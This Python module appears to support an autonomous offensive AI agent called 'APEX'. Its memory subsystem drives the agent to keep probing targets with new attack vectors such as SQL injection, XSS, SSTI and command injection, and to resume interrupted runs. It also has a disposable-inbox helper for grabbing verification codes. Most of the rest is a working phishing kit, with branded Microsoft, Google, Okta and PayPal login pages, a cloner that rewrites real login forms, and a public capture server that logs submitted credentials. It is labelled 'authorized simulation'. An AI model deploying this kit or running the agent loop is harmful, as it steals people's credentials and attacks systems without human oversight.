#!/usr/bin/env python3
"""
apex_ops — supporting subsystems for the APEX agent.

Three things live here, each usable on its own:

  Memory        Durable record of what was tried, what it proved, what died.
                Injected into the prompt every step so the model stops
                re-probing a closed surface and moves to an untried vector.

  TempMail      Disposable inboxes (mail.tm, then guerrillamail, plus a local
                sink for captures the phishing server receives).

  PhishServer   Authorized-simulation capture server + page builder. Records
                submitted fields, never executes them.

Everything persists under the agent workspace so a freeze, a crash or a
restart does not lose the run's state.
"""
from __future__ import annotations

import json
import os
import re
import random
import string
import threading
import time
import hashlib
import html as _html
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs, urljoin

import requests

TIMEOUT = 25


def _now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _atomic_json(path, data):
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=1, ensure_ascii=False)
    os.replace(tmp, path)


# ==========================================================================
# ATTEMPT / VECTOR TAXONOMY
# ==========================================================================
# Classifying the payload is what turns a raw request log into a coverage map:
# "surface X has had sqli and xss, never ssti" is the sentence that makes the
# agent try something new instead of re-firing a closed probe.
VECTOR_PATTERNS = (
    ("sqli", re.compile(r"(\bunion\b\s+(all\s+)?select|\bor\b\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+|"
                        r"'\s*or\s+'|sleep\s*\(|benchmark\s*\(|information_schema|"
                        r"pg_sleep|waitfor\s+delay|--\s|-{2}\s*$|/\*!?\d*)", re.I)),
    ("xss", re.compile(r"(<script|onerror\s*=|onload\s*=|javascript:|<svg|<img\s+src\s*=\s*x|"
                       r"alert\s*\(|prompt\s*\(|document\.cookie)", re.I)),
    ("ssti", re.compile(r"(\{\{.*?\}\}|\$\{.*?\}|<%=.*?%>|\{%.*?%\})", re.I)),
    ("path-traversal", re.compile(r"(\.\./|\.\.\\|%2e%2e|/etc/passwd|boot\.ini|c:\\\\windows)", re.I)),
    ("ssrf", re.compile(r"(https?://(127\.0\.0\.1|localhost|169\.254\.|\[::1\]|10\.|192\.168\.)"
                        r"|file://|gopher://|dict://|@127\.0\.0\.1)", re.I)),
    ("cmd-injection", re.compile(r"([;|&`]\s*(id|whoami|cat|ls|ping|curl|wget|nc)\b|"
                                 r"\$\(|`[^`]+`)", re.I)),
    ("xxe", re.compile(r"(<!ENTITY|<!DOCTYPE\s+\w+\s*\[|SYSTEM\s+['\"]file:)", re.I)),
    ("nosql", re.compile(r"(\$ne|\$gt|\$regex|\$where|\{\s*\"?\$)", re.I)),
    ("open-redirect", re.compile(r"((url|next|redirect|return|dest|continue)=https?://)", re.I)),
    ("auth-bypass", re.compile(r"(admin'?\s*--|'?\s*or\s+1\s*=\s*1|role=admin|is_admin|"
                               r"authenticated|jwt|bearer\s+null)", re.I)),
    ("idor", re.compile(r"(/(users?|accounts?|orders?|invoices?|admin)/?\d+|"
                        r"[?&](id|uid|user_id|account)=\d+)", re.I)),
    ("crlf-header", re.compile(r"(%0d%0a|\r\n)", re.I)),
)

OUTCOME_CLASSES = ("blocked", "error", "no-change", "reflected", "changed",
                   "auth-granted", "data-exposed", "server-error", "unknown")


def classify_vector(*texts):
    """Best-effort label for what kind of test a call represents."""
    blob = " ".join(str(t) for t in texts if t)
    hits = [name for name, rx in VECTOR_PATTERNS if rx.search(blob)]
    return hits[0] if hits else "generic"


def classify_outcome(status=None, body="", verdict=None):
    """Map a response onto a coarse outcome class the coverage map can reason on."""
    v = (verdict or "").lower()
    b = (body or "").lower()
    if any(k in v for k in ("auth", "login", "session", "privileged")):
        return "auth-granted"
    if any(k in v for k in ("dumped", "extracted", "exposed", "credential")):
        return "data-exposed"
    if any(k in v for k in ("reflected", "echo")):
        return "reflected"
    if any(k in v for k in ("blocked", "denied", "forbidden", "waf")):
        return "blocked"
    if status in (401, 403):
        return "blocked"
    if status and status >= 500:
        return "server-error"
    if any(k in b for k in ("syntax error", "sql error", "unclosed quotation",
                            "you have an error in your sql")):
        return "server-error"
    if status and 200 <= status < 400:
        return "no-change"
    return "unknown"


# ==========================================================================
# MEMORY
# ==========================================================================
class Memory:
    """Durable, compact mission memory.

    The point is coverage, not logging: every attempt is reduced to
    (surface, vector, outcome) so the model can be shown what is CLOSED and
    what is UNTRIED. Dead ends are first-class, because "I tried that and it
    failed" is the single most useful thing to prevent a loop.
    """

    MAX_ATTEMPTS = 400
    MAX_JOURNAL = 60

    def __init__(self, path):
        self.path = path
        self.lock = threading.RLock()
        self.data = self._load()

    # ---------- persistence ----------
    def _blank(self):
        return {"objective": "", "contract": {}, "steps": 0, "status": "idle",
                "attempts": [], "confirmed": [], "dead_ends": [], "hypotheses": [],
                "journal": [], "summary": "", "last_action": "", "updated": "",
                "campaigns": [], "inboxes": []}

    def _load(self):
        try:
            with open(self.path, encoding="utf-8") as f:
                d = json.load(f)
            base = self._blank()
            base.update(d if isinstance(d, dict) else {})
            return base
        except Exception:
            return self._blank()

    def save(self):
        with self.lock:
            self.data["updated"] = _now()
            try:
                _atomic_json(self.path, self.data)
            except Exception:
                pass

    def reset_for(self, objective, contract=None):
        with self.lock:
            keep = {"campaigns": self.data.get("campaigns", []),
                    "inboxes": self.data.get("inboxes", [])}
            self.data = self._blank()
            self.data.update(keep)
            self.data["objective"] = str(objective or "")[:2000]
            self.data["contract"] = contract or {}
            self.data["status"] = "running"
            self.data["started"] = _now()
        self.save()

    # ---------- recording ----------
    def attempt(self, step, surface, vector, payload, outcome, note="", evidence=None):
        """Record one probe. Identical (surface, vector, payload) collapses."""
        with self.lock:
            sig = hashlib.sha256(
                f"{surface}|{vector}|{payload}".encode()).hexdigest()[:12]
            for a in self.data["attempts"]:
                if a.get("sig") == sig:
                    a["tries"] = a.get("tries", 1) + 1
                    a["outcome"] = outcome or a.get("outcome")
                    a["step"] = step
                    self.save()
                    return a
            rec = {"id": len(self.data["attempts"]) + 1, "step": step,
                   "at": _now(), "surface": str(surface)[:220],
                   "vector": vector or "generic", "payload": str(payload)[:300],
                   "outcome": outcome or "unknown", "note": str(note)[:300],
                   "evidence": evidence, "sig": sig, "tries": 1}
            self.data["attempts"].append(rec)
            if len(self.data["attempts"]) > self.MAX_ATTEMPTS:
                self.data["attempts"] = self.data["attempts"][-self.MAX_ATTEMPTS:]
            self.save()
            return rec

    def confirm(self, kind, surface, snippet="", vector="", evidence_id=None):
        with self.lock:
            self.data["confirmed"].append({
                "id": len(self.data["confirmed"]) + 1, "at": _now(),
                "kind": str(kind)[:160], "surface": str(surface)[:220],
                "snippet": str(snippet)[:300], "vector": vector,
                "evidence_id": evidence_id})
            self.save()

    def dead_end(self, surface, vector, why=""):
        with self.lock:
            key = (str(surface)[:220], vector)
            for d in self.data["dead_ends"]:
                if (d.get("surface"), d.get("vector")) == key:
                    d["why"] = str(why)[:240]
                    d["tries"] = d.get("tries", 1) + 1
                    self.save()
                    return d
            rec = {"surface": key[0], "vector": vector, "why": str(why)[:240],
                   "at": _now(), "tries": 1}
            self.data["dead_ends"].append(rec)
            self.save()
            return rec

    def hypothesis(self, text, status="open"):
        with self.lock:
            for h in self.data["hypotheses"]:
                if h.get("text") == text:
                    h["status"] = status
                    self.save()
                    return h
            rec = {"text": str(text)[:400], "status": status, "at": _now()}
            self.data["hypotheses"].append(rec)
            self.save()
            return rec

    def checkpoint(self, steps=None, status=None, summary=None, last_action=None):
        """Called every step: this is what survives a freeze."""
        with self.lock:
            if steps is not None:
                self.data["steps"] = steps
            if status:
                self.data["status"] = status
            if summary:
                self.data["summary"] = str(summary)[:6000]
            if last_action:
                self.data["last_action"] = str(last_action)[:300]
                self.data["journal"].append({"step": steps, "at": _now(),
                                             "action": str(last_action)[:300]})
                if len(self.data["journal"]) > self.MAX_JOURNAL:
                    self.data["journal"] = self.data["journal"][-self.MAX_JOURNAL:]
        self.save()

    # ---------- analysis ----------
    def tried(self):
        """(surface, vector) -> strongest outcome seen."""
        rank = {"data-exposed": 6, "auth-granted": 5, "changed": 4,
                "reflected": 3, "server-error": 2, "no-change": 1,
                "blocked": 1, "error": 0, "unknown": 0}
        out = {}
        for a in self.data["attempts"]:
            k = (a.get("surface", ""), a.get("vector", "generic"))
            if k not in out or rank.get(a.get("outcome"), 0) > rank.get(out[k], 0):
                out[k] = a.get("outcome", "unknown")
        return out

    def coverage(self):
        """Group by surface so the agent can see which vectors are left."""
        cov = {}
        for (surface, vector), outcome in self.tried().items():
            cov.setdefault(surface, {})[vector] = outcome
        return cov

    def untried(self, surfaces, vectors):
        """(surface, vector) pairs never attempted — next moves, not guesses."""
        done = {(s, v) for (s, v) in self.tried()}
        # dead ends count as burned: suggesting them again just wastes steps
        dead = {(e.get("surface", ""), e.get("vector", ""))
                for e in (self.data.get("dead_ends") or [])}
        done_surfaces = {s for (s, _v) in done}
        out = []
        for s in surfaces:
            for v in vectors:
                if (s, v) in done or (s, v) in dead:
                    continue
                # a surface never touched at all is the highest-value target
                out.append((s, v, 0 if s not in done_surfaces else 1))
        out.sort(key=lambda t: t[2])
        return out

    def block(self, surfaces=None, vectors=None, max_attempts=14):
        """Prompt-ready digest. Bounded so it never crowds out the task."""
        d = self.data
        lines = []
        confirmed = d.get("confirmed") or []
        if confirmed:
            lines.append("PROVEN (do not re-prove, build on it):")
            for c in confirmed[-6:]:
                lines.append(f"  + {c['kind']} @ {c['surface'][:90]}"
                             + (f" via {c['vector']}" if c.get("vector") else ""))
        else:
            lines.append("PROVEN: nothing yet — no replay-verified exploit.")

        cov = self.coverage()
        if not surfaces and cov:
            # No harvested URLs yet: fall back to surfaces already attempted so
            # the digest can still name the vectors that are left to try.
            surfaces = list(cov.keys())
        if cov:
            lines.append("COVERAGE (surface → vector: outcome) — CLOSED combos are wasted steps:")
            for surface, vmap in list(cov.items())[-8:]:
                parts = []
                for v, o in vmap.items():
                    mark = {"data-exposed": "!!", "auth-granted": "!!", "changed": "!",
                            "reflected": "~", "server-error": "x",
                            "no-change": "-", "blocked": "B", "error": "x"}.get(o, "?")
                    parts.append(f"{v}{mark}")
                lines.append(f"  {surface[:80]} → {', '.join(parts[:10])}")
            lines.append("  legend: !! exposed/auth · ! changed · ~ reflected · "
                         "x error · - no change · B blocked")

        dead = d.get("dead_ends") or []
        if dead:
            lines.append("DEAD ENDS (do not repeat without a new payload class):")
            for e in dead[-6:]:
                lines.append(f"  - {e['surface'][:70]} × {e['vector']}: {e.get('why','')[:90]}")

        hyps = [h for h in (d.get("hypotheses") or []) if h.get("status") == "open"]
        if hyps:
            lines.append("OPEN HYPOTHESES (test these next):")
            for h in hyps[-5:]:
                lines.append(f"  ? {h['text'][:140]}")

        if surfaces and vectors:
            nxt = self.untried(surfaces, vectors)
            if nxt:
                lines.append("UNTRIED COMBINATIONS (highest value first):")
                for s, v, _p in nxt[:6]:
                    lines.append(f"  → {v} on {s[:84]}")

        atts = d.get("attempts") or []
        if atts:
            lines.append(f"LAST {min(len(atts), max_attempts)} ATTEMPTS:")
            for a in atts[-max_attempts:]:
                lines.append(f"  #{a['id']} {a['vector']:<14} {a.get('outcome','?'):<13} "
                             f"{str(a.get('payload',''))[:60]} -> {a['surface'][:60]}")
        if not lines:
            return ("MISSION MEMORY: empty — nothing tried yet. Your first probe "
                    "should map the surface, not guess payloads.")
        return "MISSION MEMORY (persists across steps, freezes and restarts):\n" + \
            "\n".join(lines)

    def resume_brief(self):
        """What the operator means by 'keep trying': where we stopped and why."""
        d = self.data
        cov = self.coverage()
        lines = ["RESUME BRIEFING — you are continuing a mission that was interrupted.",
                 f"Objective: {d.get('objective','')[:400]}",
                 f"Steps completed before the interruption: {d.get('steps', 0)}",
                 f"Last recorded action: {d.get('last_action','(none)')}"]
        if d.get("summary"):
            lines.append("Summary you already produced (treat as your own prior work):\n"
                         + str(d["summary"])[:2500])
        if cov:
            lines.append("Surfaces already probed: " + "; ".join(
                f"{s[:60]} ({','.join(v)})" for s, v in list(cov.items())[-6:]))
        dead = d.get("dead_ends") or []
        if dead:
            lines.append("Known dead ends: " + "; ".join(
                f"{e['surface'][:50]}×{e['vector']}" for e in dead[-6:]))
        lines.append("Do NOT restart from step one and do NOT repeat the attempts "
                     "listed above. Pick the highest-value untried vector from "
                     "MISSION MEMORY and continue.")
        return "\n".join(lines)


# ==========================================================================
# TEMPORARY MAIL
# ==========================================================================
class TempMail:
    """Disposable inboxes for verification-code and reset-link flows.

    Providers are tried in order and remembered per-account, so a later call
    reuses the same mailbox rather than creating a new one each step:
      mail.tm        real IMAP-less JSON API, JWT auth, works headless
      guerrillamail  no-auth fallback when mail.tm is blocked or rate-limited
      local          the phishing capture server's own sink (offline testing)
    """

    MAILTM = "https://api.mail.tm"
    GUERRILLA = "https://api.guerrillamail.com/ajax.php"

    def __init__(self, path, sink_path=None):
        self.path = path
        self.sink_path = sink_path
        self.lock = threading.RLock()
        self.data = self._load()

    def _blank(self):
        return {"accounts": [], "active": None}

    def _load(self):
        try:
            with open(self.path, encoding="utf-8") as f:
                d = json.load(f)
            base = self._blank()
            base.update(d if isinstance(d, dict) else {})
            return base
        except Exception:
            return self._blank()

    def save(self):
        with self.lock:
            try:
                _atomic_json(self.path, dict(self.data))
            except Exception:
                pass

    # ---------- helpers ----------
    @staticmethod
    def _rand(n=10):
        return "".join(random.choice(string.ascii_lowercase + string.digits)
                       for _ in range(n))

    def _session(self):
        s = requests.Session()
        s.headers.update({"User-Agent": "APEX-Agent/2.0", "Accept": "application/json"})
        return s

    # ---------- providers ----------
    def _mailtm_domains(self, s):
        r = s.get(f"{self.MAILTM}/domains?page=1", timeout=TIMEOUT)
        r.raise_for_status()
        items = r.json()
        if isinstance(items, dict):
            items = items.get("hydra:member", [])
        doms = [d.get("domain") for d in items if d.get("domain")]
        if not doms:
            raise RuntimeError("mail.tm returned no domains")
        return doms

    def create_mailtm(self, label=None):
        s = self._session()
        dom = self._mailtm_domains(s)[0]
        local = (label or "apex") + self._rand(8)
        address = f"{local}@{dom}"
        password = self._rand(16)
        r = s.post(f"{self.MAILTM}/accounts",
                   json={"address": address, "password": password}, timeout=TIMEOUT)
        if r.status_code not in (200, 201):
            raise RuntimeError(f"mail.tm account create failed: {r.status_code} "
                               f"{r.text[:200]}")
        tok = s.post(f"{self.MAILTM}/token",
                     json={"address": address, "password": password}, timeout=TIMEOUT)
        tok.raise_for_status()
        token = tok.json().get("token")
        acct = {"provider": "mail.tm", "address": address, "password": password,
                "token": token, "id": self._rand(8), "created": _now(),
                "seen": []}
        return acct

    def create_guerrilla(self, label=None):
        s = self._session()
        s.headers.update({"User-Agent": "Mozilla/5.0", "Accept": "application/json"})
        r = s.get(self.GUERRILLA, params={"f": "get_email_address", "lang": "en"},
                  timeout=TIMEOUT)
        r.raise_for_status()
        j = r.json()
        acct = {"provider": "guerrillamail", "address": j.get("email_addr"),
                "sid": j.get("sid_token"), "id": self._rand(8), "created": _now(),
                "seen": []}
        return acct

    def create_local(self, label=None):
        addr = f"{(label or 'apex')}-{self._rand(6)}@lab.local"
        return {"provider": "local", "address": addr, "id": self._rand(8),
                "created": _now(), "seen": []}

    def create(self, label=None, provider="auto"):
        """Create a mailbox and make it active. Returns the account record."""
        errors = []
        order = ([provider] if provider in ("mail.tm", "guerrillamail", "local")
                 else ["mail.tm", "guerrillamail", "local"])
        for p in order:
            try:
                if p == "mail.tm":
                    acct = self.create_mailtm(label)
                elif p == "guerrillamail":
                    acct = self.create_guerrilla(label)
                else:
                    acct = self.create_local(label)
                with self.lock:
                    self.data["accounts"].append(acct)
                    self.data["active"] = acct["id"]
                self.save()
                return acct
            except Exception as e:
                errors.append(f"{p}: {type(e).__name__}: {str(e)[:120]}")
        raise RuntimeError("no mail provider available — " + " | ".join(errors))

    def active(self):
        for a in self.data.get("accounts", []):
            if a.get("id") == self.data.get("active"):
                return a
        return None

    def use(self, ident):
        for a in self.data.get("accounts", []):
            if a.get("id") == ident or a.get("address") == ident:
                self.data["active"] = a["id"]
                self.save()
                return a
        raise RuntimeError(f"unknown mailbox: {ident}")

    # ---------- reading ----------
    def _mailtm_token(self, acct):
        if acct.get("token"):
            return acct["token"]
        s = self._session()
        r = s.post(f"{self.MAILTM}/token",
                   json={"address": acct["address"], "password": acct["password"]},
                   timeout=TIMEOUT)
        r.raise_for_status()
        acct["token"] = r.json().get("token")
        self.save()
        return acct["token"]

    def _local_sink(self):
        if not self.sink_path or not os.path.exists(self.sink_path):
            return []
        out = []
        try:
            with open(self.sink_path, encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        try:
                            out.append(json.loads(line))
                        except Exception:
                            pass
        except Exception:
            return []
        return out

    def inbox(self, acct=None, limit=10):
        """Return [{id, from, subject, seen, preview}] newest first."""
        acct = acct or self.active()
        if not acct:
            raise RuntimeError("no active mailbox — create one first")
        prov = acct.get("provider")
        msgs = []
        if prov == "mail.tm":
            s = self._session()
            tok = self._mailtm_token(acct)
            s.headers.update({"Authorization": f"Bearer {tok}"})
            r = s.get(f"{self.MAILTM}/messages?page=1", timeout=TIMEOUT)
            if r.status_code == 401:      # token expired: refresh once
                acct["token"] = None
                s.headers["Authorization"] = f"Bearer {self._mailtm_token(acct)}"
                r = s.get(f"{self.MAILTM}/messages?page=1", timeout=TIMEOUT)
            r.raise_for_status()
            items = r.json()
            if isinstance(items, dict):
                items = items.get("hydra:member", [])
            for m in items[:limit]:
                frm = m.get("from") or {}
                msgs.append({"id": m.get("id"),
                             "from": frm.get("address") or frm.get("name") or "?",
                             "subject": m.get("subject") or "",
                             "seen": bool(m.get("seen")),
                             "intro": (m.get("intro") or "")[:200],
                             "date": m.get("createdAt")})
        elif prov == "guerrillamail":
            s = self._session()
            s.headers.update({"User-Agent": "Mozilla/5.0"})
            r = s.get(self.GUERRILLA, params={"f": "get_email_list", "offset": 0,
                                              "sid_token": acct.get("sid")},
                      timeout=TIMEOUT)
            r.raise_for_status()
            for m in (r.json().get("list") or [])[:limit]:
                msgs.append({"id": m.get("mail_id"),
                             "from": m.get("mail_from") or "?",
                             "subject": m.get("mail_subject") or "",
                             "seen": False,
                             "intro": (m.get("mail_excerpt") or "")[:200],
                             "date": m.get("mail_timestamp")})
        else:
            for cap in self._local_sink()[-limit:][::-1]:
                msgs.append({"id": cap.get("capture_id"),
                             "from": cap.get("ip") or "source",
                             "subject": cap.get("subject") or "phish capture",
                             "seen": True,
                             "intro": json.dumps(cap.get("fields") or {})[:200],
                             "date": cap.get("time")})
        return {"address": acct.get("address"), "provider": prov,
                "count": len(msgs), "messages": msgs}

    def read(self, msg_id, acct=None):
        """Full body of one message, plus any codes/links worth quoting."""
        acct = acct or self.active()
        if not acct:
            raise RuntimeError("no active mailbox")
        prov = acct.get("provider")
        body = ""
        subj = ""
        frm = ""
        if prov == "mail.tm":
            s = self._session()
            s.headers.update({"Authorization": f"Bearer {self._mailtm_token(acct)}"})
            r = s.get(f"{self.MAILTM}/messages/{msg_id}", timeout=TIMEOUT)
            r.raise_for_status()
            j = r.json()
            subj = j.get("subject") or ""
            frm = (j.get("from") or {}).get("address") or ""
            body = " ".join(j.get("text") or []) or ""
            if not body and j.get("html"):
                body = re.sub(r"<[^>]+>", " ", " ".join(j.get("html") or []))
        elif prov == "guerrillamail":
            s = self._session()
            s.headers.update({"User-Agent": "Mozilla/5.0"})
            r = s.get(self.GUERRILLA, params={"f": "fetch_email", "email_id": msg_id,
                                              "sid_token": acct.get("sid")},
                      timeout=TIMEOUT)
            r.raise_for_status()
            j = r.json()
            subj = j.get("mail_subject") or ""
            frm = j.get("mail_from") or ""
            body = re.sub(r"<[^>]+>", " ", j.get("mail_body") or "")
        else:
            for cap in self._local_sink():
                if cap.get("capture_id") == msg_id:
                    body = json.dumps(cap, indent=1)
                    subj = cap.get("subject") or ""
                    break
        codes = re.findall(r"\b(\d{4,8})\b", body)[:6]
        links = re.findall(r"https?://[^\s\"'<>)]+", body)[:6]
        return {"id": msg_id, "from": frm, "subject": subj,
                "body": re.sub(r"\s+", " ", body).strip()[:4000],
                "codes": codes, "links": links}


# ==========================================================================
# PHISHING PAGE BUILDER + CAPTURE SERVER
# ==========================================================================
PAGE_TEMPLATES = ("generic", "o365", "gmail", "vpn", "sharepoint", "okta", "paypal")

_BRANDS = {
    "o365": ("Microsoft", "#0078d4", "Sign in to your account",
             "Microsoft account", "Work or school, or personal Microsoft account"),
    "gmail": ("Google", "#1a73e8", "Sign in", "Google", "Use your Google Account"),
    "vpn": ("Remote Access", "#0b5fff", "VPN Portal — Sign in",
            "Corporate VPN", "Use your directory credentials"),
    "sharepoint": ("Microsoft", "#0364b8", "Sign in to SharePoint",
                   "SharePoint Online", "Work or school account"),
    "okta": ("Okta", "#00297a", "Sign In", "Okta", "Username and password required"),
    "paypal": ("PayPal", "#003087", "Log in to your account", "PayPal",
               "Pay with your PayPal account"),
    "generic": ("Sign in", "#2f6fed", "Sign in to continue", "Portal",
                "Enter your credentials"),
}


class PhishPageBuilder:
    """Builds credential-capture pages for authorized simulations.

    Every generated page carries an X-Simulation marker, an HTML comment
    footer, and a nonce so a page found in the wild can be attributed to this
    engagement. Captured values are written to JSONL and never executed.
    """

    def build(self, template="generic", title=None, subtitle=None,
              brand_label=None, fields=None, redirect="https://example.org/",
              target_url=None, nonce=None):
        tpl = template if template in _BRANDS else "generic"
        brand, accent, d_title, d_brand, d_sub = _BRANDS[tpl]
        title = title or d_title
        subtitle = subtitle or d_sub
        brand_label = brand_label or d_brand
        fields = fields or [{"name": "username", "type": "text",
                             "label": "Email or username", "placeholder": "name@company.com"},
                            {"name": "password", "type": "password",
                             "label": "Password", "placeholder": ""}]
        nonce = nonce or PhishPageBuilder.nonce()
        inputs = []
        for f in fields:
            name = _html.escape(str(f.get("name") or "field"))
            typ = _html.escape(str(f.get("type") or "text"))
            label = _html.escape(str(f.get("label") or name))
            ph = _html.escape(str(f.get("placeholder") or ""))
            inputs.append(
                f'      <label for="{name}">{label}</label>\n'
                f'      <input id="{name}" name="{name}" type="{typ}" '
                f'placeholder="{ph}" autocomplete="off" required>')
        note = ""
        if target_url:
            note = f"<!-- cloned from: {_html.escape(target_url[:300])} -->"
        return f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="x-simulation" content="{nonce}">
<title>{_html.escape(title)}</title>
{note}
<style>
 *{{box-sizing:border-box}}
 body{{margin:0;font:15px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
   background:#f3f4f6;color:#1f2328;display:flex;min-height:100vh;align-items:center;justify-content:center}}
 .card{{background:#fff;padding:34px 30px;border-radius:10px;width:100%;max-width:400px;
   box-shadow:0 2px 14px rgba(0,0,0,.10)}}
 .brand{{display:flex;align-items:center;gap:9px;font-weight:600;font-size:17px;margin-bottom:20px}}
 .logo{{width:26px;height:26px;border-radius:5px;background:{accent};flex:none}}
 h1{{font-size:21px;margin:0 0 6px}}
 p.sub{{color:#5b6573;font-size:13px;margin:0 0 20px}}
 label{{display:block;font-size:13px;font-weight:600;margin:12px 0 5px}}
 input{{width:100%;padding:10px 12px;border:1px solid #c9d1d9;border-radius:6px;font-size:15px}}
 input:focus{{outline:2px solid {accent};border-color:{accent}}}
 button{{width:100%;margin-top:22px;padding:11px;border:0;border-radius:6px;
   background:{accent};color:#fff;font-size:15px;font-weight:600;cursor:pointer}}
 .foot{{margin-top:18px;font-size:11px;color:#8b98a8;text-align:center}}
 .foot a{{color:{accent};text-decoration:none}}
</style></head>
<body>
<div class="card">
  <div class="brand"><span class="logo"></span>{_html.escape(brand_label)}</div>
  <h1>{_html.escape(title)}</h1>
  <p class="sub">{_html.escape(subtitle)}</p>
  <form method="POST" action="/__capture">
{chr(10).join(inputs)}
    <input type="hidden" name="__redirect" value="{_html.escape(redirect)}">
    <input type="hidden" name="__nonce" value="{nonce}">
    <button type="submit">Sign in</button>
  </form>
  <div class="foot">Authorized security simulation · {nonce}</div>
</div>
</body></html>"""

    def clone(self, url, capture_redirect="https://example.org/", timeout=TIMEOUT):
        """Rewrite a real login page so its form posts to the capture endpoint."""
        r = requests.get(url, timeout=timeout, verify=False,
                         headers={"User-Agent": "Mozilla/5.0 (compatible; APEX simulate)"})
        page = r.text
        forms = re.findall(r"<form\b[^>]*>", page, re.I)
        fields = re.findall(r"<input\b[^>]*>", page, re.I)
        names = []
        for f in fields:
            m = re.search(r'name\s*=\s*["\']([^"\']+)["\']', f, re.I)
            t = re.search(r'type\s*=\s*["\']([^"\']+)["\']', f, re.I)
            if m and (t.group(1).lower() if t else "text") not in ("hidden", "submit"):
                names.append({"name": m.group(1),
                              "type": "password" if t and t.group(1).lower() == "password" else "text",
                              "label": m.group(1).replace("_", " ").title(),
                              "placeholder": ""})
        for f in forms:
            page = page.replace(f, '<form method="POST" action="/__capture">', 1)
        nonce = PhishPageBuilder.nonce()
        inject = (f'<meta name="x-simulation" content="{nonce}">'
                  f'<input type="hidden" name="__nonce" value="{nonce}">'
                  f'<input type="hidden" name="__redirect" value="{_html.escape(capture_redirect)}">')
        page = re.sub(r"(<form\b[^>]*>)", r"\1" + inject.replace("\\", "\\\\"), page,
                      count=1, flags=re.I)
        if "__nonce" not in page:      # no form at all: fall back to a built page
            return self.build(template="generic", target_url=url,
                              redirect=capture_redirect), names, nonce
        return page, names, nonce

    @staticmethod
    def nonce():
        return "SIM-" + hashlib.sha256(
            f"{time.time()}{random.random()}".encode()).hexdigest()[:10].upper()


class PhishServer:
    """Local capture server. One campaign at a time, threaded, stoppable."""

    def __init__(self, log_path):
        self.log_path = log_path
        self.lock = threading.RLock()
        self.httpd = None
        self.thread = None
        self.state = {"running": False, "port": None, "page": None, "title": None,
                      "nonce": None, "redirect": None, "served": 0, "captures": 0,
                      "started": None, "bind": None}
        os.makedirs(os.path.dirname(log_path), exist_ok=True)

    # ---------- lifecycle ----------
    def start(self, page_html, port=8088, bind="0.0.0.0", title="Sign in",
              redirect="https://example.org/", nonce=None):
        with self.lock:
            if self.state.get("running"):
                self.stop()
            server = self
            cap = {"n": 0}

            class Handler(BaseHTTPRequestHandler):
                protocol_version = "HTTP/1.1"

                def log_message(self, *a):
                    pass

                def _send(self, body, code=200, ctype="text/html; charset=utf-8",
                          extra=None):
                    raw = body.encode("utf-8", "replace")
                    self.send_response(code)
                    self.send_header("Content-Type", ctype)
                    self.send_header("Content-Length", str(len(raw)))
                    for k, v in (extra or {}).items():
                        self.send_header(k, v)
                    self.end_headers()
                    try:
                        self.wfile.write(raw)
                    except Exception:
                        pass

                def do_GET(self):
                    with server.lock:
                        server.state["served"] += 1
                        page = server.state["page"]
                    u = urlparse(self.path)
                    if u.path in ("/", "/index.html", "/login", "/signin", "/auth"):
                        return self._send(page or "<h1>no page</h1>")
                    if u.path == "/__health":
                        return self._send(json.dumps({"ok": True}), ctype="application/json")
                    return self._send("<h1>404</h1>", code=404)

                def do_POST(self):
                    ln = int(self.headers.get("Content-Length") or 0)
                    raw = self.rfile.read(min(ln, 65536)).decode("utf-8", "replace")
                    form = {k: v[0] for k, v in parse_qs(raw, keep_blank_values=True).items()}
                    redirect = form.pop("__redirect", None) or server.state.get("redirect")
                    nonce = form.pop("__nonce", None) or server.state.get("nonce")
                    rec = {"capture_id": uuid_short(), "time": _now(),
                           "ip": self.client_address[0],
                           "user_agent": self.headers.get("User-Agent", "")[:200],
                           "path": self.path[:300],
                           "fields": form,
                           "nonce": nonce,
                           "subject": (server.state.get("title") or "capture")[:120]}
                    with server.lock:
                        server.state["captures"] += 1
                        cap["n"] += 1
                    with open(server.log_path, "a", encoding="utf-8") as f:
                        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
                    try:
                        server.on_capture and server.on_capture(rec)
                    except Exception:
                        pass
                    self._send("<html><body><p>Signing you in…</p>"
                               "<script>location.replace(" +
                               json.dumps(redirect or "https://example.org/") +
                               ");</script></body></html>")

                def do_HEAD(self):
                    self._send("")

            for attempt in range(12):
                p = port + attempt
                try:
                    self.httpd = ThreadingHTTPServer((bind, p), Handler)
                    self.httpd.daemon_threads = True
                    self.state.update({
                        "running": True, "port": p, "page": page_html,
                        "title": title, "nonce": nonce, "redirect": redirect,
                        "served": 0, "captures": 0, "started": _now(), "bind": bind})
                    break
                except OSError:
                    if attempt == 11:
                        raise RuntimeError(f"no free port in {port}-{port + 11}")
            self.thread = threading.Thread(target=self.httpd.serve_forever,
                                           daemon=True)
            self.thread.start()
            return dict(self.state)

    def stop(self):
        with self.lock:
            if self.httpd:
                try:
                    self.httpd.shutdown()
                    self.httpd.server_close()
                except Exception:
                    pass
            self.httpd = None
            self.state["running"] = False
        return dict(self.state)

    on_capture = None

    def captures(self, limit=50):
        out = []
        if os.path.exists(self.log_path):
            try:
                with open(self.log_path, encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            try:
                                out.append(json.loads(line))
                            except Exception:
                                pass
            except Exception:
                pass
        return out[-limit:][::-1]

    def clear(self):
        try:
            open(self.log_path, "w").close()
        except Exception:
            pass
        with self.lock:
            self.state["captures"] = 0


def uuid_short():
    return hashlib.sha256(f"{time.time()}{random.random()}".encode()).hexdigest()[:10]
